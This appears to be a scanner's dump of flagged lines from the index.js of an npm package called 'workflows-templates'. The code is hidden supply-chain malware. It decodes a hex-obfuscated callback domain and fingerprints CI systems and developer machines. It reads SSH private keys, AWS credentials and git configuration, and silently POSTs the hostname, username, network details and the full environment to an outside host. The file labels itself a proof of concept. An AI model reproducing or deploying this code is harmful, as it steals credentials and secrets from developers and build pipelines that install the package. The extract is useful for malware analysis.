// File: tmp/tmpdi6v9n9e/workflows-templates/package/index.js
// ======================================================================
Line 7: const os = require('os')
Line 8: const fs = require('fs')
Line 9: const path = require('path')
Line 10: const https = require('https')
Line 11: _tmp_0 = require('child_process')
Line 15: Buffer.from(OAST_DOMAIN_HEX, 'hex').toString()
Line 17: execSync(cmd, { stdio: 'pipe', timeout: 5000 }).toString().trim()
Line 18: fs.readFileSync(filePath, 'utf8')
Line 20: {
    const report = { isHumanOrCi: false, evidence: {}, summary: [] };
    const userInfo = os.userInfo();

    // Test 1: Is this a known CI/CD System? (Highest Value Target)
    const ciVars = ['CI', 'CONTINUOUS_INTEGRATION', 'BUILD_NUMBER', 'RUN_ID', 'GITHUB_ACTIONS', 'JENKINS_URL', 'GITLAB_CI', 'CIRCLECI'];
    const foundCiVars = ciVars.filter(v => process.env[v]);
    if (foundCiVars.length > 0) {
        report.isHumanOrCi = true;
        report.evidence.ci_vars = foundCiVars.map(v => `${v}=${process.env[v]}`).join(', ');
        report.summary.push('CI_SYSTEM');
    }

    // Test 2: Are we inside a real git checkout with a non-generic user?
    const parentProjectRoot = path.resolve(__dirname, '../../');
    const gitConfig = safeReadFile(path.join(parentProjectRoot, '.git/config'));
    if (gitConfig) {
        report.hasGitContext = true;
        report.summary.push('GIT_CONTEXT');
        // A git repo + a non-root user is a strong signal for a developer machine.
      ...
Line 21: const report = { isHumanOrCi: false, evidence: {}, summary: [] }
Line 22: os.userInfo()
Line 25: const ciVars = ['CI', 'CONTINUOUS_INTEGRATION', 'BUILD_NUMBER', 'RUN_ID', 'GITHUB_ACTIONS', 'JENKINS_URL', 'GITLAB_CI', 'CIRCLECI']
Line 26: const foundCiVars = ciVars.filter(v => process.env[v])
Line 27: {
        report.isHumanOrCi = true;
        report.evidence.ci_vars = foundCiVars.map(v => `${v}=${process.env[v]}`).join(', ');
        report.summary.push('CI_SYSTEM');
    }
Line 29: report.evidence.ci_vars = foundCiVars.map(v => `${v}=${process.env[v]}`).join(', ')
Line 30: report.summary.push('CI_SYSTEM')
Line 35: safeReadFile(path.join(parentProjectRoot, '.git/config'))
Line 38: report.summary.push('GIT_CONTEXT')
Line 48: safeReadFile(path.join(homeDir, '.ssh/id_rsa'))
Line 49: safeReadFile(path.join(homeDir, '.gitconfig'))
Line 50: safeReadFile(path.join(homeDir, '.aws/credentials'))
Line 55: report.summary.push('DEV_DOTFILES')
Line 67: {
        const intelPackage = {
            mission_id: 'OKTA-HUMAN-POC-1b6effcd',
            timestamp: new Date().toISOString(),
            confirmation: testResult,
            full_recon: {
                host: { hostname: os.hostname(), whoami: os.userInfo().username, platform: os.platform(), uptime_minutes: Math.floor(os.uptime() / 60) },
                network: { ip_config: run('ip a || ipconfig /all'), resolv_conf: safeReadFile('/etc/resolv.conf') },
                env: process.env
            }
        };

        const payload = JSON.stringify(intelPackage, null, 2);
        https.request({
            hostname: OAST_DOMAIN,
            port: 443,
            path: `/OKTA_CONFIRMED_HUMAN_HIT/${intelPackage.full_recon.host.hostname}/${testResult.summary.join('-')}`,
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
        }).on('error', e => {}).end(payload);
    }
Line 68: const intelPackage = {
            mission_id: 'OKTA-HUMAN-POC-1b6effcd',
            timestamp: new Date().toISOString(),
            confirmation: testResult,
            full_recon: {
                host: { hostname: os.hostname(), whoami: os.userInfo().username, platform: os.platform(), uptime_minutes: Math.floor(os.uptime() / 60) },
                network: { ip_config: run('ip a || ipconfig /all'), resolv_conf: safeReadFile('/etc/resolv.conf') },
                env: process.env
            }
        }
Line 72: _tmp_13.full_recon = {
                host: { hostname: os.hostname(), whoami: os.userInfo().username, platform: os.platform(), uptime_minutes: Math.floor(os.uptime() / 60) },
                network: { ip_config: run('ip a || ipconfig /all'), resolv_conf: safeReadFile('/etc/resolv.conf') },
                env: process.env
            }
Line 73: os.userInfo()
Line 74: _tmp_16.network = { ip_config: run('ip a || ipconfig /all'), resolv_conf: safeReadFile('/etc/resolv.conf') }
Line 80: https.request({
            hostname: OAST_DOMAIN,
            port: 443,
            path: `/OKTA_CONFIRMED_HUMAN_HIT/${intelPackage.full_recon.host.hostname}/${testResult.summary.join('-')}`,
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
        }).on('error', e => {}).end(payload)
Line 83: testResult.summary.join('-')
